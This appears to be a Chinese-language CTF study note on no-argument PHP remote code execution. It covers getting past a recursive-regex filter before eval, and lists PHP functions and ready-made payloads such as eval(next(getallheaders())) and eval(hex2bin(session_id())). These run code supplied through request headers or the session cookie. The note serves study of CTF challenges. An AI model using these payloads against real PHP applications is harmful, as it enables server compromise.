# 原理
	- 情景
		- 某些题目会使用类似`/[^\W]+\((?R)?\)/`的正则表达式匹配并删除某个字符串中的内容，如果替换结果为`;`则执行原字符串
		- 也就是说，我们可以传入一个类似`aaa(bbb(ccc()));`的字符串并eval
		- 此时我们可以构造特殊的payload进行RCE
	- 比如
		- `pos(localeconv())`的结果是字符串`"."`
		- `var_dump(scandir("."));`可以打印当前文件夹中的内容
		- 我们就可以使用`var_dump(scandir(pos(localeconv())));`通过那个正则的检测并打印当前文件夹的内容
	- RCE
		- 首先想想如何构造任意字符串
			- 可以从headers中拿到：`next(getallheaders())`
				- 这样可以拿到最后一个header字段
				- 如果你想拼运气的话，可以使用array_rand随机拿一个header字段
			- 可以考虑拿GET/POST参数
		- 然后传给system函数即可
- # 常用函数
	- ```
	  scandir 
	  var_dump 
	  show_source 
	  localtime 
	  time 
	  current 
	  chr 
	  pos 
	  end 
	  next 
	  prev 
	  array_reverse 
	  readfile
	  array_flip
	  array_rand
	  array_reverse
	  file_get_contents
	  ```
- # 常见payload
	- ```
	  点
	  pos(localeconv())
	  next(str_split(zend_version()))
	  1
	  end(str_split(hebrevc(crypt(next(hash_algos())))))
	  
	  chr(ord(crypt(serialize(array()))))
	  
	  Ua
	  next(getallheaders())
	  
	  eval
	  eval(implode(reset(get_defined_vars())))
	  eval(next(getallheaders()))
	  eval(hex2bin(session_id())) # 其中session_id由PHPSESSID cookie控制
	  ```
- # 绕过
	- 如果正则支持函数名使用任意字符的话，可以使用PHP的动态函数调用技巧
	- 参考： [[CTF/WP/极客大挑战 2020 Roamphp4-Rceme]]
- # 其他知识点
	- ```
	  readfile()[readgzfile()]
	  读取文件并写入到输出缓冲。
	  highlight_file()[别名：show_source()]
	  语法高亮一个文件
	  scandir()
	  列出指定路径中的文件和目录
	  direname()
	  给出一个包含有指向一个文件的全路径的字符串，本函数返回去掉文件名后的目录名。
	  2/19
	  getcwd()
	  取得当前工作目录。
	  chdir($directory)
	  将 PHP 的当前目录改为 directory。
	  读取环境变量
	  get_defined_vars()
	  此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义
	  的变量。
	  getenv
	  获取一个环境变量的值
	  localeconv()
	  返回一包含本地数字及货币格式信息的数组,第一个值一直是.
	  phpversion()
	  获取当前的 PHP 版本
	  zend_version()
	  获取当前的 zend 版本（配合 str_split()割出点）
	  会话
	  session_id
	  获取/设置当前会话 ID
	  session_start
	  启动新会话或者重用现有会话
	  ```
-